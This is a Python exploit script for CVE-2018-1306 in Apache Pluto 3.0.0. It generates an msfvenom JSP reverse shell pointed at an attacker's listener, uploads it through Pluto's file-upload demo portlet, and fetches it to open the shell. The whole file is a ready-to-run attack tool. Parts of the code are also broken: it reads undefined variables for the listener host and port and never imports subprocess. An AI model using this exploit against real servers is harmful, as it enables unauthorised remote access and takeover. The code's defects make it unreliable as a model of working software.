import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2018-1306
# Apache Pluto 3.0.0 RCE.
class CVE2018_1306:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, lhost, lport):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    # prepare payload
    def prepare_payload(self):
        print (LogColors.BLUE + "prepare payload..." + LogColors.ENDC)
        msfv = "msfvenom -p java/jsp_shell_reverse_tcp"
        msfv += " LHOST=" + lhost
        msfv += " LPORT=" + lport
        msfv += " -f raw"
        msfv += " -o /tmp/hack.jsp"
        print (LogColors.YELLOW + msfv + LogColors.ENDC)
        try:
            p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
            p.wait()
            print (LogColors.GREEN + "reverse shell payload successfully generated :)" + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "generate payload failed :(" + LogColors.ENDC)
            sys.exit()

    # send payload. update file with rev shell code
    def send_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        url = self.url + "/pluto/portal/File%20Upload/"
        url += "__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0"
        files = {'file' : open("/tmp/hack.jsp", "rb")}
        r = self.session.head(url, files = files)
        if r.status_code == 302:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()

    # check reverse shell
    def check(self):
        print (LogColors.BLUE + "check rev shell..." + LogColors.ENDC)
        shell_url = self.url + "/PortletV3AnnotatedDemo/temp/hack.jsp"
        r = self.session.get(shell_url)
        print (LogColors.YELLOW + shell_url + " :)" + LogColors.ENDC)
        if r.ok:
            print (LogColors.GREEN + "rev shell successfully checked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "check reverse shell failed :(" + LogColors.ENDC)
            sys.exit()

    # exploitation logic
    def exploit(self):
        self.prepare_payload()
        self.send_payload()
        self.check()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    ip, port = args['ip'], args['port']
    cve = CVE2018_1306(url, ip, port)
    cve.exploit()

